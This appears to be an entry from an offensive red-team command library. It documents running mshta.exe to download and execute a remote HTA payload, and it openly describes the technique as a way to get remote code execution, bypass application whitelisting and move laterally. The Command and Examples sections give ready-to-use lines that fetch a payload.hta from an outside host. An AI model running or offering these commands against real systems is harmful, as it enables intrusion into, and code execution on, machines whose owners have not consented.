---
id: 8eedf2fd-2d80-4240-9d9a-289db50ac643
name: Execute-HTA-Payload-via-HTTP
type: command
executor: cmd
data: mshta $_URL
output: null
created_at: '2023-04-06T03:56:26.859036+00:00'
updated_at: '2023-04-10T20:37:11.492312+00:00'
platforms:
  - Windows
tags:
  - mshta
  - execution
verified: true
validated: true
---

# Execute-HTA-Payload-via-HTTP

## Command

```cmd
mshta $_URL
```

## Description

This command invokes mshta.exe to download and execute an HTA file from a remote HTTP server. It is used in scenarios requiring remote code execution via a trusted binary, such as bypassing whitelisting during initial access or lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_URL | Full HTTP URL to the HTA file (e.g., http://webserver/payload.hta) | Yes |

## Examples

### Basic Usage

```cmd
mshta http://192.168.1.100/payload.hta
```

### Advanced Usage

```cmd
mshta http://webserver.domain.com/folder/payload.hta
```

## Expected Output

Mshta typically produces no console output on success; a brief window may flash if not closed by the payload. Successful execution is confirmed by the HTA's effects, such as spawned processes (e.g., powershell.exe) or network callbacks. On failure (e.g., invalid URL): "Cannot find file" error dialog.

## Related

- [[procedures/Mshta-Remote-HTA-Execution]]
- [[commands/Execute-HTA-Payload-via-WebDAV]]
